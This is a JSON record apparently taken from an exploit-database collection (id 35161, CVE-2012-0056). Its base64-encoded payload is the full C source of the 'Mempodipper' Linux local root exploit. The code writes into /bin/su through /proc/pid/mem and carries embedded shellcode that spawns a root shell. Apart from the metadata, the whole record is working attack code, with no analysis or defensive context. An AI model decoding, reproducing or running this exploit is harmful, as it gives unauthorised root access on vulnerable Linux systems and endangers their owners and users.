{
    "source": "exploit-database", 
    "exploit": "LyoNCkV4cGxvaXQgY29kZSBpcyBoZXJlOiBodHRwOi8vZ2l0Lnp4MmM0LmNvbS9DVkUtMjAxMi0wMDU2L3BsYWluL21lbXBvZGlwcGVyLmMNCkJsb2cgcG9zdCBhYm91dCBpdCBpcyBoZXJlOiBodHRwOi8vYmxvZy56eDJjNC5jb20vNzQ5DQoqLw0KDQovKg0KICogTWVtcG9kaXBwZXINCiAqIGJ5IHp4MmM0DQogKiANCiAqIExpbnV4IExvY2FsIFJvb3QgRXhwbG9pdA0KICogDQogKiBSYXRoZXIgdGhhbiBwdXQgbXkgd3JpdGUgdXAgaGVyZSwgcGVyIHVzdWFsLCB0aGlzIHRpbWUgSSd2ZSBwdXQgaXQNCiAqIGluIGEgcmF0aGVyIGxlbmd0aHkgYmxvZyBwb3N0OiBodHRwOi8vYmxvZy56eDJjNC5jb20vNzQ5DQogKiANCiAqIEVuam95Lg0KICogDQogKiAtIHp4MmM0DQogKiBKYW4gMjEsIDIwMTINCiAqIA0KICogQ1ZFLTIwMTItMDA1Ng0KICovDQoNCiNkZWZpbmUgX0xBUkdFRklMRTY0X1NPVVJDRQ0KI2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3lzL3VuLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvdXNlci5oPg0KI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4NCiNpbmNsdWRlIDxzeXMvcmVnLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxsaW1pdHMuaD4NCg0KY2hhciAqcHJvZ19uYW1lOw0KDQppbnQgc2VuZF9mZChpbnQgc29jaywgaW50IGZkKQ0Kew0KCWNoYXIgYnVmWzFdOw0KCXN0cnVjdCBpb3ZlYyBpb3Y7DQoJc3RydWN0IG1zZ2hkciBtc2c7DQoJc3RydWN0IGNtc2doZHIgKmNtc2c7DQoJaW50IG47DQoJY2hhciBjbXNbQ01TR19TUEFDRShzaXplb2YoaW50KSldOw0KDQoJYnVmWzBdID0gMDsNCglpb3YuaW92X2Jhc2UgPSBidWY7DQoJaW92Lmlvdl9sZW4gPSAxOw0KDQoJbWVtc2V0KCZtc2csIDAsIHNpemVvZiBtc2cpOw0KCW1zZy5tc2dfaW92ID0gJmlvdjsNCgltc2cubXNnX2lvdmxlbiA9IDE7DQoJbXNnLm1zZ19jb250cm9sID0gKGNhZGRyX3QpY21zOw0KCW1zZy5tc2dfY29udHJvbGxlbiA9IENNU0dfTEVOKHNpemVvZihpbnQpKTsNCg0KCWNtc2cgPSBDTVNHX0ZJUlNUSERSKCZtc2cpOw0KCWNtc2ctPmNtc2dfbGVuID0gQ01TR19MRU4oc2l6ZW9mKGludCkpOw0KCWNtc2ctPmNtc2dfbGV2ZWwgPSBTT0xfU09DS0VUOw0KCWNtc2ctPmNtc2dfdHlwZSA9IFNDTV9SSUdIVFM7DQoJbWVtbW92ZShDTVNHX0RBVEEoY21zZyksICZmZCwgc2l6ZW9mKGludCkpOw0KDQoJaWYgKChuID0gc2VuZG1zZyhzb2NrLCAmbXNnLCAwKSkgIT0gaW92Lmlvdl9sZW4pDQoJCXJldHVybiAtMTsNCgljbG9zZShzb2NrKTsNCglyZXR1cm4gMDsNCn0NCg0KaW50IHJlY3ZfZmQoaW50IHNvY2spDQp7DQoJaW50IG47DQoJaW50IGZkOw0KCWNoYXIgYnVmWzFdOw0KCXN0cnVjdCBpb3ZlYyBpb3Y7DQoJc3RydWN0IG1zZ2hkciBtc2c7DQoJc3RydWN0IGNtc2doZHIgKmNtc2c7DQoJY2hhciBjbXNbQ01TR19TUEFDRShzaXplb2YoaW50KSldOw0KCQ0KCWlvdi5pb3ZfYmFzZSA9IGJ1ZjsNCglpb3YuaW92X2xlbiA9IDE7DQoNCgltZW1zZXQoJm1zZywgMCwgc2l6ZW9mIG1zZyk7DQoJbXNnLm1zZ19uYW1lID0gMDsNCgltc2cubXNnX25hbWVsZW4gPSAwOw0KCW1zZy5tc2dfaW92ID0gJmlvdjsNCgltc2cubXNnX2lvdmxlbiA9IDE7DQoNCgltc2cubXNnX2NvbnRyb2wgPSAoY2FkZHJfdCljbXM7DQoJbXNnLm1zZ19jb250cm9sbGVuID0gc2l6ZW9mIGNtczsNCg0KCWlmICgobiA9IHJlY3Ztc2coc29jaywgJm1zZywgMCkpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCWlmIChuID09IDApDQoJCXJldHVybiAtMTsNCgljbXNnID0gQ01TR19GSVJTVEhEUigmbXNnKTsNCgltZW1tb3ZlKCZmZCwgQ01TR19EQVRBKGNtc2cpLCBzaXplb2YoaW50KSk7DQoJY2xvc2Uoc29jayk7DQoJcmV0dXJuIGZkOw0KfQ0KDQp1bnNpZ25lZCBsb25nIHB0cmFjZV9hZGRyZXNzKCkNCnsNCglpbnQgZmRbMl07DQoJcHJpbnRmKCJbK10gQ3JlYXRpbmcgcHRyYWNlIHBpcGUuXG4iKTsNCglwaXBlKGZkKTsNCglmY250bChmZFswXSwgRl9TRVRGTCwgT19OT05CTE9DSyk7DQoNCglwcmludGYoIlsrXSBGb3JraW5nIHB0cmFjZSBjaGlsZC5cbiIpOw0KCWludCBjaGlsZCA9IGZvcmsoKTsNCglpZiAoY2hpbGQpIHsNCgkJY2xvc2UoZmRbMV0pOw0KCQljaGFyIGJ1ZjsNCgkJcHJpbnRmKCJbK10gV2FpdGluZyBmb3IgcHRyYWNlZCBjaGlsZCB0byBnaXZlIG91dHB1dCBvbiBzeXNjYWxscy5cbiIpOw0KCQlmb3IgKDs7KSB7DQoJCQl3YWl0KE5VTEwpOw0KCQkJaWYgKHJlYWQoZmRbMF0sICZidWYsIDEpID4gMCkNCgkJCQlicmVhazsNCgkJCXB0cmFjZShQVFJBQ0VfU1lTQ0FMTCwgY2hpbGQsIE5VTEwsIE5VTEwpOw0KCQl9DQoJCQ0KCQlwcmludGYoIlsrXSBFcnJvciBtZXNzYWdlIHdyaXR0ZW4uIFNpbmdsZSBzdGVwcGluZyB0byBmaW5kIGFkZHJlc3MuXG4iKTsNCgkJc3RydWN0IHVzZXJfcmVnc19zdHJ1Y3QgcmVnczsNCgkJZm9yICg7Oykgew0KCQkJcHRyYWNlKFBUUkFDRV9TSU5HTEVTVEVQLCBjaGlsZCwgTlVMTCwgTlVMTCk7DQoJCQl3YWl0KE5VTEwpOw0KCQkJcHRyYWNlKFBUUkFDRV9HRVRSRUdTLCBjaGlsZCwgTlVMTCwgJnJlZ3MpOw0KI2lmIGRlZmluZWQoX19pMzg2X18pDQojZGVmaW5lIGluc3RydWN0aW9uX3BvaW50ZXIgcmVncy5laXANCiNkZWZpbmUgdXBwZXJfYm91bmQgMHhiMDAwMDAwMA0KI2VsaWYgZGVmaW5lZChfX3g4Nl82NF9fKQ0KI2RlZmluZSBpbnN0cnVjdGlvbl9wb2ludGVyIHJlZ3MucmlwDQojZGVmaW5lIHVwcGVyX2JvdW5kIDB4NzAwMDAwMDAwMDAwDQojZWxzZQ0KI2Vycm9yICJUaGF0IHBsYXRmb3JtIGlzIG5vdCBzdXBwb3J0ZWQuIg0KI2VuZGlmDQoJCQlpZiAoaW5zdHJ1Y3Rpb25fcG9pbnRlciA8IHVwcGVyX2JvdW5kKSB7DQoJCQkJdW5zaWduZWQgbG9uZyBpbnN0cnVjdGlvbiA9IHB0cmFjZShQVFJBQ0VfUEVFS1RFWFQsIGNoaWxkLCBpbnN0cnVjdGlvbl9wb2ludGVyLCBOVUxMKTsNCgkJCQlpZiAoKGluc3RydWN0aW9uICYgMHhmZmZmKSA9PSAweDI1ZmYgLyogam1wIHIvbTMyICovKQ0KCQkJCQlyZXR1cm4gaW5zdHJ1Y3Rpb25fcG9pbnRlcjsNCgkJCX0NCgkJfQ0KCX0gZWxzZSB7DQoJCXByaW50ZigiWytdIFB0cmFjZV90cmFjZW1lJ2luZyBwcm9jZXNzLlxuIik7DQoJCWlmIChwdHJhY2UoUFRSQUNFX1RSQUNFTUUsIDAsIE5VTEwsIE5VTEwpIDwgMCkgew0KCQkJcGVycm9yKCJbLV0gcHRyYWNlIik7DQoJCQlyZXR1cm4gMDsNCgkJfQ0KCQljbG9zZShmZFswXSk7DQoJCWR1cDIoZmRbMV0sIDIpOw0KCQlleGVjbCgiL2Jpbi9zdSIsICJzdSIsICJub3QtYS12YWxpZC11c2VyIiwgTlVMTCk7DQoJfQ0KCXJldHVybiAwOw0KfQ0KDQp1bnNpZ25lZCBsb25nIG9iamR1bXBfYWRkcmVzcygpDQp7DQoJRklMRSAqY29tbWFuZCA9IHBvcGVuKCJvYmpkdW1wIC1kIC9iaW4vc3V8Z3JlcCAnPGV4aXRAcGx0Pid8aGVhZCAtbiAxfGN1dCAtZCAnICcgLWYgMXxzZWQgJ3MvXlswXSpcXChbXjBdKlxcKS8weFxcMS8nIiwgInIiKTsNCglpZiAoIWNvbW1hbmQpIHsNCgkJcGVycm9yKCJbLV0gcG9wZW4iKTsNCgkJcmV0dXJuIDA7DQoJfQ0KCWNoYXIgcmVzdWx0WzMyXTsNCglmZ2V0cyhyZXN1bHQsIDMyLCBjb21tYW5kKTsNCglwY2xvc2UoY29tbWFuZCk7DQoJcmV0dXJuIHN0cnRvdWwocmVzdWx0LCBOVUxMLCAxNik7DQp9DQoNCnVuc2lnbmVkIGxvbmcgZmluZF9hZGRyZXNzKCkNCnsNCglwcmludGYoIlsrXSBQdHJhY2luZyBzdSB0byBmaW5kIG5leHQgaW5zdHJ1Y3Rpb24gd2l0aG91dCByZWFkaW5nIGJpbmFyeS5cbiIpOw0KCXVuc2lnbmVkIGxvbmcgYWRkcmVzcyA9IHB0cmFjZV9hZGRyZXNzKCk7DQoJaWYgKCFhZGRyZXNzKSB7DQoJCXByaW50ZigiWy1dIFB0cmFjZSBmYWlsZWQuXG4iKTsNCgkJcHJpbnRmKCJbK10gUmVhZGluZyBzdSBiaW5hcnkgd2l0aCBvYmpkdW1wIHRvIGZpbmQgZXhpdEBwbHQuXG4iKTsNCgkJYWRkcmVzcyA9IG9iamR1bXBfYWRkcmVzcygpOw0KCQlpZiAoYWRkcmVzcyA9PSBVTE9OR19NQVggfHwgIWFkZHJlc3MpIHsNCgkJCXByaW50ZigiWy1dIENvdWxkIG5vdCByZXNvbHZlIC9iaW4vc3UuIFNwZWNpZnkgdGhlIGV4aXRAcGx0IGZ1bmN0aW9uIGFkZHJlc3MgbWFudWFsbHkuXG4iKTsNCgkJCXByaW50ZigiWy1dIFVzYWdlOiAlcyAtbyBBRERSRVNTXG5bLV0gRXhhbXBsZTogJXMgLW8gMHg0MDIxNzhcbiIsIHByb2dfbmFtZSwgcHJvZ19uYW1lKTsNCgkJCWV4aXQoLTEpOw0KCQl9DQoJfQ0KCXByaW50ZigiWytdIFJlc29sdmVkIGNhbGwgYWRkcmVzcyB0byAweCVseC5cbiIsIGFkZHJlc3MpOw0KCXJldHVybiBhZGRyZXNzOw0KfQ0KDQppbnQgc3VfcGFkZGluZygpDQp7DQoJcHJpbnRmKCJbK10gQ2FsY3VsYXRpbmcgc3UgcGFkZGluZy5cbiIpOw0KCUZJTEUgKmNvbW1hbmQgPSBwb3BlbigiL2Jpbi9zdSB0aGlzLXVzZXItZG9lcy1ub3QtZXhpc3QgMj4mMSIsICJyIik7DQoJaWYgKCFjb21tYW5kKSB7DQoJCXBlcnJvcigiWy1dIHBvcGVuIik7DQoJCWV4aXQoMSk7DQoJfQ0KCWNoYXIgcmVzdWx0WzI1Nl07DQoJZmdldHMocmVzdWx0LCAyNTYsIGNvbW1hbmQpOw0KCXBjbG9zZShjb21tYW5kKTsNCglyZXR1cm4gc3Ryc3RyKHJlc3VsdCwgInRoaXMtdXNlci1kb2VzLW5vdC1leGlzdCIpIC0gcmVzdWx0Ow0KfQ0KDQppbnQgY2hpbGQoaW50IHNvY2spDQp7DQoJY2hhciBwYXJlbnRfbWVtWzI1Nl07DQoJc3ByaW50ZihwYXJlbnRfbWVtLCAiL3Byb2MvJWQvbWVtIiwgZ2V0cHBpZCgpKTsNCglwcmludGYoIlsrXSBPcGVuaW5nIHBhcmVudCBtZW0gJXMgaW4gY2hpbGQuXG4iLCBwYXJlbnRfbWVtKTsNCglpbnQgZmQgPSBvcGVuKHBhcmVudF9tZW0sIE9fUkRXUik7DQoJaWYgKGZkIDwgMCkgew0KCQlwZXJyb3IoIlstXSBvcGVuIik7DQoJCXJldHVybiAxOw0KCX0NCglwcmludGYoIlsrXSBTZW5kaW5nIGZkICVkIHRvIHBhcmVudC5cbiIsIGZkKTsNCglzZW5kX2ZkKHNvY2ssIGZkKTsNCglyZXR1cm4gMDsNCn0NCg0KaW50IHBhcmVudCh1bnNpZ25lZCBsb25nIGFkZHJlc3MpDQp7DQoJaW50IHNvY2tldHNbMl07DQoJcHJpbnRmKCJbK10gT3BlbmluZyBzb2NrZXRwYWlyLlxuIik7DQoJaWYgKHNvY2tldHBhaXIoQUZfVU5JWCwgU09DS19TVFJFQU0sIDAsIHNvY2tldHMpIDwgMCkgew0KCQlwZXJyb3IoIlstXSBzb2NrZXRwYWlyIik7DQoJCXJldHVybiAxOw0KCX0NCglpZiAoZm9yaygpKSB7DQoJCXByaW50ZigiWytdIFdhaXRpbmcgZm9yIHRyYW5zZmVycmVkIGZkIGluIHBhcmVudC5cbiIpOw0KCQlpbnQgZmQgPSByZWN2X2ZkKHNvY2tldHNbMV0pOw0KCQlwcmludGYoIlsrXSBSZWNlaXZlZCBmZCBhdCAlZC5cbiIsIGZkKTsNCgkJaWYgKGZkIDwgMCkgew0KCQkJcGVycm9yKCJbLV0gcmVjdl9mZCIpOw0KCQkJcmV0dXJuIDE7DQoJCX0NCgkJcHJpbnRmKCJbK10gQXNzaWduaW5nIGZkICVkIHRvIHN0ZGVyci5cbiIsIGZkKTsNCgkJZHVwMigyLCAxNSk7DQoJCWR1cDIoZmQsIDIpOw0KDQoJCXVuc2lnbmVkIGxvbmcgb2Zmc2V0ID0gYWRkcmVzcyAtIHN1X3BhZGRpbmcoKTsNCgkJcHJpbnRmKCJbK10gU2Vla2luZyB0byBvZmZzZXQgMHglbHguXG4iLCBvZmZzZXQpOw0KCQlsc2VlazY0KGZkLCBvZmZzZXQsIFNFRUtfU0VUKTsNCgkJDQojaWYgZGVmaW5lZChfX2kzODZfXykNCgkJLy8gU2VlIHNoZWxsY29kZS0zMi5zIGluIHRoaXMgcGFja2FnZSBmb3IgdGhlIHNvdXJjZS4NCgkJY2hhciBzaGVsbGNvZGVbXSA9DQoJCQkiXHgzMVx4ZGJceGIwXHgxN1x4Y2RceDgwXHgzMVx4ZGJceGIwXHgyZVx4Y2RceDgwXHgzMVx4YzlceGIzIg0KCQkJIlx4MGZceGIxXHgwMlx4YjBceDNmXHhjZFx4ODBceDMxXHhjMFx4NTBceDY4XHg2ZVx4MmZceDczXHg2OCINCgkJCSJceDY4XHgyZlx4MmZceDYyXHg2OVx4ODlceGUzXHgzMVx4ZDJceDY2XHhiYVx4MmRceDY5XHg1Mlx4ODkiDQoJCQkiXHhlMFx4MzFceGQyXHg1Mlx4NTBceDUzXHg4OVx4ZTFceDMxXHhkMlx4MzFceGMwXHhiMFx4MGJceGNkIg0KCQkJIlx4ODAiOw0KI2VsaWYgZGVmaW5lZChfX3g4Nl82NF9fKQ0KCQkvLyBTZWUgc2hlbGxjb2RlLTY0LnMgaW4gdGhpcyBwYWNrYWdlIGZvciB0aGUgc291cmNlLg0KCQljaGFyIHNoZWxsY29kZVtdID0NCgkJCSJceDQ4XHgzMVx4ZmZceGIwXHg2OVx4MGZceDA1XHg0OFx4MzFceGZmXHhiMFx4NmFceDBmXHgwNVx4NDgiDQoJCQkiXHgzMVx4ZjZceDQwXHhiN1x4MGZceDQwXHhiNlx4MDJceGIwXHgyMVx4MGZceDA1XHg0OFx4YmJceDJmIg0KCQkJIlx4MmZceDYyXHg2OVx4NmVceDJmXHg3M1x4NjhceDQ4XHhjMVx4ZWJceDA4XHg1M1x4NDhceDg5XHhlNyINCgkJCSJceDQ4XHgzMVx4ZGJceDY2XHhiYlx4MmRceDY5XHg1M1x4NDhceDg5XHhlMVx4NDhceDMxXHhjMFx4NTAiDQoJCQkiXHg1MVx4NTdceDQ4XHg4OVx4ZTZceDQ4XHgzMVx4ZDJceGIwXHgzYlx4MGZceDA1IjsNCiNlbHNlDQojZXJyb3IgIlRoYXQgcGxhdGZvcm0gaXMgbm90IHN1cHBvcnRlZC4iDQojZW5kaWYNCgkJcHJpbnRmKCJbK10gRXhlY3V0aW5nIHN1IHdpdGggc2hlbGxjb2RlLlxuIik7DQoJCWV4ZWNsKCIvYmluL3N1IiwgInN1Iiwgc2hlbGxjb2RlLCBOVUxMKTsNCgl9IGVsc2Ugew0KCQljaGFyIHNvY2tbMzJdOw0KCQlzcHJpbnRmKHNvY2ssICIlZCIsIHNvY2tldHNbMF0pOw0KCQlwcmludGYoIlsrXSBFeGVjdXRpbmcgY2hpbGQgZnJvbSBjaGlsZCBmb3JrLlxuIik7DQoJCWV4ZWNsKCIvcHJvYy9zZWxmL2V4ZSIsIHByb2dfbmFtZSwgIi1jIiwgc29jaywgTlVMTCk7DQoJfQ0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDQp7DQoJcHJvZ19uYW1lID0gYXJndlswXTsNCgkNCglpZiAoYXJnYyA+IDIgJiYgYXJndlsxXVswXSA9PSAnLScgJiYgYXJndlsxXVsxXSA9PSAnYycpDQoJCXJldHVybiBjaGlsZChhdG9pKGFyZ3ZbMl0pKTsNCgkNCglwcmludGYoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbiIpOw0KCXByaW50ZigiPSAgICAgICAgICBNZW1wb2RpcHBlciAgICAgICAgPVxuIik7DQoJcHJpbnRmKCI9ICAgICAgICAgICBieSB6eDJjNCAgICAgICAgICA9XG4iKTsNCglwcmludGYoIj0gICAgICAgICBKYW4gMjEsIDIwMTIgICAgICAgID1cbiIpOw0KCXByaW50ZigiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsNCgkNCglpZiAoYXJnYyA+IDIgJiYgYXJndlsxXVswXSA9PSAnLScgJiYgYXJndlsxXVsxXSA9PSAnbycpDQoJCXJldHVybiBwYXJlbnQoc3RydG91bChhcmd2WzJdLCBOVUxMLCAxNikpOw0KCWVsc2UNCgkJcmV0dXJuIHBhcmVudChmaW5kX2FkZHJlc3MoKSk7DQoJDQp9", 
    "filename": "platforms/linux/local/35161.c", 
    "id": "35161", 
    "cves": [
        "CVE-2012-0056"
    ]
}